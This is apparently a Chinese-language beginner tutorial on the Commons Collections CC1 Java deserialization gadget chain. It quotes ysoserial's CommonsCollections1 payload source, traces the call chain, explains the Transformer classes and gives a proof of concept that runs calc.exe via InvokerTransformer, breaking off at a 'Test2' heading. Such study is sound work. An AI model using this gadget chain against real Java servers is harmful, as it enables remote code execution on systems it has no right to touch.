## 前言
虽然已经有很多大佬已经发了CC1-7的分析，但是我觉得有些地方没有特别清楚，我就来啰嗦的写一篇吧，对新手比较友好。
Java集合框架是JDK1.2中的一个重要补充。它添加了许多功能强大的数据结构，加快了最重要的Java应用程序的开发。从那时起，它已成为Java中公认的集合处理标准。  
Commons集合试图通过提供新的接口、实现和实用程序来构建JDK类。
Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons
Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。
ysoerial中CommonsCollection1源码如下：
    public class CommonsCollections1 extends PayloadRunner implements ObjectPayload {
        public InvocationHandler getObject(final String command) throws Exception {
            final String[] execArgs = new String[] { command };
            // inert chain for setup
            final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
            // real chain for after setup
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                    new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                    new ConstantTransformer(1) };
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
            final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
            Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
            return handler;
        }
        public static void main(final String[] args) throws Exception {
            PayloadRunner.run(CommonsCollections1.class, args);
        }
        public static boolean isApplicableJavaVersion() {
            return JavaVersion.isAnnInvHUniversalMethodImpl();
        }
    }
利用链：
    ObjectInputStream.readObject()
                AnnotationInvocationHandler.readObject()
                    Map(Proxy).entrySet()
                        AnnotationInvocationHandler.invoke()
                            LazyMap.get()
                                ChainedTransformer.transform()
                                    ConstantTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Class.getMethod()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.getRuntime()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.exec()
## 环境搭建
  * JDK1.7
  * commons-collections 3.1
创建一个Maven项目，不用选择任何Maven模板；  
在pom.xml中添加如下代码：
                commons-collections
                commons-collections
                3.1
刷新一下，成功导入commons-collections-3.1。  
## 相关类和接口
**TransformedMap**  
TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。
    public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {
            ......
            public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
            return new TransformedMap(map, keyTransformer, valueTransformer);
        }
        protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
            super(map);
            this.keyTransformer = keyTransformer;
            this.valueTransformer = valueTransformer;
        }
        ......
        public Object put(Object key, Object value) {
            key = transformKey(key);
            value = transformValue(value);
            return getMap().put(key, value);
        }
        public void putAll(Map mapToCopy) {
            mapToCopy = transformMap(mapToCopy);
            getMap().putAll(mapToCopy);
        }
**ChainedTransformer**  
ChainedTransformer是实现了Transformer、Serializable接⼝的⼀个类，它的作⽤是将内部的多个Transformer串  
在⼀起，将前一个回调返回的结果作为后一个的参数传入。
    public class ChainedTransformer implements Transformer, Serializable {
        ......
        public ChainedTransformer(Transformer[] transformers) {
            super();
            iTransformers = transformers;
        }
        public Object transform(Object object) {
            for (int i = 0; i < iTransformers.length; i++) {
                object = iTransformers[i].transform(object);
            }
            return object;
        }
        ......
    }
**Transformer**  
Transformer是一个接口，只有一个带实现的方法；  
TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个“回调  
函数”，这个回调的参数是原始对象。
    public interface Transformer {
        public Object transform(Object input);
    }
**ConstantTransformer**  
ConstantTransformer是实现了Transformer、Serializable接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回；
作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作。
    public class ConstantTransformer implements Transformer, Serializable {
        .......
        public ConstantTransformer(Object constantToReturn) {
                super();
                iConstant = constantToReturn;
            }
        public Object transform(Object input) {
                return iConstant;
            }
        }
        .......
**InvokerTransformer**  
InvokerTransformer是实现了Transformer、Serializable接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序  
列化能执⾏任意代码的关键；
在实例化这个InvokerTransformer时，需要传⼊三个参数：
  * 第⼀个参数是待执⾏的⽅法名
  * 第⼆个参数是这个函数的参数列表的参数类型
  * 第三个参数是传给这个函数的参数列表
后面transform方法，通过反射调用执行了input对象的iMethodName方法。
    public class InvokerTransformer implements Transformer, Serializable {
        ......
        public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            super();
            iMethodName = methodName;
            iParamTypes = paramTypes;
            iArgs = args;
        }
        public Object transform(Object input) {
            if (input == null) {
                return null;
            }
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(iMethodName, iParamTypes);
                return method.invoke(input, iArgs);
            } catch (NoSuchMethodException ex) {
                throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException ex) {
                throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException ex) {
                throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
            }
        }
    }
## TransformedMap链
### Test1
先构造一个简单的POC：
    import org.apache.commons.collections.*;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.util.HashMap;
    import java.util.Map;
    public class Test1 {
        public static void main(String[] args) throws Exception {
            //构建一个transformer的数组
            Transformer[] transformers = new Transformer[] {
                    //返回Runtime对象
                    new ConstantTransformer(Runtime.getRuntime()),
                    //调用exec方法执行calc.exe命令
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})
            };
            //将transformers数组传入ChainedTransformer类
            Transformer transformerChain = new ChainedTransformer(transformers);
            //创建Map并绑定transformerChain
            Map innerMap = new HashMap();
            //包装innerMap
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            //触发回调
            outerMap.put("test1", "xxxx");
        }
    }
Transformer是一个接口，ConstantTransformer和InvokerTransformer都是Transformer接口的实现类；  
这里并不是new了一个接口，而是new了一个Transformer类型的数组，里面存储的是 Transformer的实现类对象。
然后使用ChainedTransformer对transformers 数组进行一系列回调；
将创建的innerMap和transformerChain传入TransformedMap.decorate；  
最后要向Map中放入一个新元素，从而执行命令。  
## Test2